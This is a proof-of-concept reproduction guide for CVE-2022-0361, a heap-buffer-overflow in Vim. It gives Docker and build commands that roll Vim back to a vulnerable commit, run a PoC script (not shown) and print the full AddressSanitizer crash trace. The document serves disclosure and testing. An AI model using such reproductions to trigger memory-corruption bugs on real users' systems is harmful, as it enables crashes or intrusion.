### CVE-2022-0361

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/a055618c-0311-409c-a78a-99477121965b/)

### Docker Container Run Command
```shell
docker build -t cve-2022-0361-poc .
docker run -itd --name CVE-2022-0361-POC cve-2022-0361-poc
docker exec -it CVE-2022-0361-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the Vim repository. (ssh-keygen)
cd /poc
git clone git@github.com:vim/vim.git

# Rollback to the vulnerable version.
cd vim/
git reset --hard 058ee7c5699ef551be5aa04c66b3cffc436e9b08

# Install the compilation and installation dependencies for Vim.
apt install gcc make valgrind clang-13 libtool-bin build-essential llvm-dev libunwind-dev -y

# Enter the `src` directory.
cd ./src

# Configure, compile, and install Vim.
./configure --with-features=huge --enable-gui=no --enable-pythoninterp=no CFLAGS="-fsanitize=address -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address"
make
make install

# Open the poc file.
vim -u NONE -i NONE -n -X -Z -e -m -s -S /poc/poc.vim -c ":qa!"
```

### Description
Observed that:
```
=================================================================
==9942==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffffb4a1dd01 at pc 0xffffb92fe120 bp 0xffffca6b7100 sp 0xffffca6b7148
READ of size 1 at 0xffffb4a1dd01 thread T0
#0 0xffffb92fe11c in __interceptor_strlen ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:389
#1 0xaaaad5cf60e8  (/usr/local/bin/vim+0x5220e8)
#2 0xaaaad5d0fbb0  (/usr/local/bin/vim+0x53bbb0)
#3 0xaaaad5cb7594  (/usr/local/bin/vim+0x4e3594)
#4 0xaaaad5afc5cc  (/usr/local/bin/vim+0x3285cc)
#5 0xaaaad5afc328  (/usr/local/bin/vim+0x328328)
#6 0xaaaad5afb9f8  (/usr/local/bin/vim+0x3279f8)
#7 0xaaaad5ad42b4  (/usr/local/bin/vim+0x3002b4)
#8 0xaaaad5ac95e8  (/usr/local/bin/vim+0x2f55e8)
#9 0xaaaad5e7c680  (/usr/local/bin/vim+0x6a8680)
#10 0xaaaad5e7a524  (/usr/local/bin/vim+0x6a6524)
#11 0xaaaad5e7a584  (/usr/local/bin/vim+0x6a6584)
#12 0xaaaad5ad42b4  (/usr/local/bin/vim+0x3002b4)
#13 0xaaaad5ac95e8  (/usr/local/bin/vim+0x2f55e8)
#14 0xaaaad5ac7520  (/usr/local/bin/vim+0x2f3520)
#15 0xaaaad6198944  (/usr/local/bin/vim+0x9c4944)
#16 0xaaaad61908d4  (/usr/local/bin/vim+0x9bc8d4)
#17 0xaaaad618ffb8  (/usr/local/bin/vim+0x9bbfb8)
#18 0xffffb90473f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#19 0xffffb90474c8 in __libc_start_main_impl ../csu/libc-start.c:392
#20 0xaaaad59216ec  (/usr/local/bin/vim+0x14d6ec)

0xffffb4a1dd01 is located 1 bytes to the right of 4096-byte region [0xffffb4a1cd00,0xffffb4a1dd00)
allocated by thread T0 here:
#0 0xffffb936a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xaaaad5921c44  (/usr/local/bin/vim+0x14dc44)
#2 0xaaaad59219cc  (/usr/local/bin/vim+0x14d9cc)
#3 0xaaaad619d478  (/usr/local/bin/vim+0x9c9478)
#4 0xaaaad619b318  (/usr/local/bin/vim+0x9c7318)
#5 0xaaaad5c54400  (/usr/local/bin/vim+0x480400)
#6 0xaaaad5c41028  (/usr/local/bin/vim+0x46d028)
#7 0xaaaad59403a8  (/usr/local/bin/vim+0x16c3a8)
#8 0xaaaad5ab1e20  (/usr/local/bin/vim+0x2dde20)
#9 0xaaaad5af1db8  (/usr/local/bin/vim+0x31ddb8)
#10 0xaaaad5aef604  (/usr/local/bin/vim+0x31b604)
#11 0xaaaad5ad42b4  (/usr/local/bin/vim+0x3002b4)
#12 0xaaaad5ac95e8  (/usr/local/bin/vim+0x2f55e8)
#13 0xaaaad5e7c680  (/usr/local/bin/vim+0x6a8680)
#14 0xaaaad5e7a524  (/usr/local/bin/vim+0x6a6524)
#15 0xaaaad5e7a584  (/usr/local/bin/vim+0x6a6584)
#16 0xaaaad5ad42b4  (/usr/local/bin/vim+0x3002b4)
#17 0xaaaad5ac95e8  (/usr/local/bin/vim+0x2f55e8)
#18 0xaaaad5ac7520  (/usr/local/bin/vim+0x2f3520)
#19 0xaaaad6198944  (/usr/local/bin/vim+0x9c4944)
#20 0xaaaad61908d4  (/usr/local/bin/vim+0x9bc8d4)
#21 0xaaaad618ffb8  (/usr/local/bin/vim+0x9bbfb8)
#22 0xffffb90473f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#23 0xffffb90474c8 in __libc_start_main_impl ../csu/libc-start.c:392
#24 0xaaaad59216ec  (/usr/local/bin/vim+0x14d6ec)

SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:389 in __interceptor_strlen
Shadow bytes around the buggy address:
0x200ff6943b50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff6943b60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff6943b70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff6943b80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff6943b90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff6943ba0:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff6943bb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff6943bc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff6943bd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff6943be0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff6943bf0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==9942==ABORTING
```


